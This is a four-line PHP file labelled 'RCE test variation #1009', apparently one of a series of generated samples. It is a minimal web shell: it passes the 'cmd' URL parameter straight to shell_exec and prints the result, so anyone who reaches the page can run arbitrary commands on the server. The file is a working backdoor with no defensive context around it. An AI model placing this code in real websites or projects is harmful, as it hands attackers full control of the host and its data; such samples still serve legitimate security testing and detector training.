<?php
// RCE test variation #1009
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>